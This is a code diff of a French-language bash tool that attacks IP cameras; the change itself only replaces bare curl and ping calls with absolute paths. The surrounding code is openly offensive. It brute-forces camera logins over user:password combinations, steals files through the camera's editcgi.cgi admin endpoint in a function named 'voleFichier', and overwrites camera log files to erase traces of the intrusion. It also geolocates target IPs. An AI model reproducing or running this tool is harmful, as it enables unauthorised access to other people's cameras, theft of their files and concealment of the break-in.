@@ -115,7 +115,7 @@ liste_modeles_verifies=("205" "206" "207" "207W" "207MW" "209FD" "209MFD" "210" 
 # detecte si erreur 401 : page non autorisée
 function checkConnectiviteCible {
 	#ping_timeout=10
-	packets_perdus=$(ping -W $ping_timeout -c 1 $ip|grep '%'|cut -d ' ' -f 6|cut -d '%' -f 1)
+	packets_perdus=$(/bin/ping -W $ping_timeout -c 1 $ip|grep '%'|cut -d ' ' -f 6|cut -d '%' -f 1)
 	if [ $packets_perdus -ne 0 ];then
 		echo "ECHEC"
 	else
@@ -135,7 +135,7 @@ function fullModeleDetect {
 
 	
 	for url_possible in ${url_a_verifier[*]}; do	
-		modele_complet=$(curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -k -s "http://$ip_cam$url_possible"  |grep --binary-files=text -i '<TITLE'|cut -d '>' -f 2|cut -d '<' -f 1)	
+		modele_complet=$(/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -k -s "http://$ip_cam$url_possible"  |grep --binary-files=text -i '<TITLE'|cut -d '>' -f 2|cut -d '<' -f 1)	
 				
 		if [[ "$modele_complet" = "" ]] ||  [[ "$modele_complet" = " " ]] || [[ -z "${modele_complet##*Bad*}" ]] || [[ -z "${modele_complet##*Index*}" ]] || [[ -z "${modele_complet##*Unauthorized*}" ]] ||   [[ -z "${modele_complet##*Not*}" ]]  ||  [[ -z "${modele_complet##*page*}" ]] ;then
 			modele_complet=$modele_nondetecte
@@ -155,7 +155,7 @@ function fullModeleDetect {
 # detecte si erreur 401 : page non autorisée
 function checkUrlProtegee {
 	url_checker_p=$1	
-	test_url_p=$(curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_p|grep -i '401 ')
+	test_url_p=$(/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_p|grep -i '401 ')
 	if [ ${#test_url_p} -gt 0 ];then
 		protegee='OUI'
 	else
@@ -168,7 +168,7 @@ function checkUrlProtegee {
 # detecte si erreur 404 : page introuvable
 function checkUrlExiste {
 	url_checker_e=$1	
-	test_url_e=$(curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_e|grep -i '404 ')
+	test_url_e=$(/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime --retry-max-time $curl_maxtime -ks $url_checker_e|grep -i '404 ')
 	if [ ${#test_url_e} -gt 0 ];then
 		existe="NON"
 	else
@@ -253,7 +253,7 @@ function infosGeolocalisation {
 	ip_port=$1
 	ip_only=${ip_port%:*}
 
-	infosDbIpDotCom=$(curl -ks http://api.db-ip.com/v2/free/$ip_only)
+	infosDbIpDotCom=$(/usr/bin/curl -ks http://api.db-ip.com/v2/free/$ip_only)
 
 	#retirer les infos inutiles
 	infosDbIpDotCom=${infosDbIpDotCom/'"ipAddress'*[0-9]'",'/''}
@@ -312,7 +312,7 @@ function effacerTraces {
 	contenu=$(echo -e $banniere_logs|base64 -d)
 	
 	for fic_a_vid in ${fichiers_a_vider[*]} ;do
-		curl -ks "http://$ip_cam/admin-bin/editcgi.cgi?file=$fic_a_vid" -d "save_file=$fic_a_vid&mode=0100666&convert_crlf_to_lf=on&submit= Save file &content=$contenu" --connect-timeout $curl_timeout --max-time $curl_maxtime --user $user:$mdp > $fichier_temp 
+		/usr/bin/curl -ks "http://$ip_cam/admin-bin/editcgi.cgi?file=$fic_a_vid" -d "save_file=$fic_a_vid&mode=0100666&convert_crlf_to_lf=on&submit= Save file &content=$contenu" --connect-timeout $curl_timeout --max-time $curl_maxtime --user $user:$mdp > $fichier_temp 
 	done
 	
 	}
@@ -324,7 +324,7 @@ function voleFichier {
 	fichier_a_voler=$2
 	fichier_temp='/tmp/fichier_vole.txt'
 	url_vole="http://$ip_cam/admin-bin/editcgi.cgi?file=$fichier_a_voler"
-	curl -ks --connect-timeout $curl_timeout --max-time $curl_maxtime "$url_vole" --user $user:$mdp  > $fichier_temp #silent_get=$()
+	/usr/bin/curl -ks --connect-timeout $curl_timeout --max-time $curl_maxtime "$url_vole" --user $user:$mdp  > $fichier_temp #silent_get=$()
 	fichier_vole=''
 	record=''
 	while read ligne; do
@@ -866,7 +866,7 @@ if [ "$checkOnly" != "OUI" ];then
 			echo -en "$jaune[+] Attaque $jaune_fonce$jaune$ip: "$(afficherBarre "$total_fait" "$nb_combinaisons")"$jaune [$cyan$user$jaune:$cyan$mdp$jaune] "
 			
 			#Requete HTTP
-			curl --connect-timeout $curl_timeout --max-time $curl_maxtime -k -s "$url" --user "$user:$mdp"  -o $tmp	
+			/usr/bin/curl --connect-timeout $curl_timeout --max-time $curl_maxtime -k -s "$url" --user "$user:$mdp"  -o $tmp	
 			
 			#pour debug rapide: if [ $total_fait -gt 5 ];then exit; fi
 			
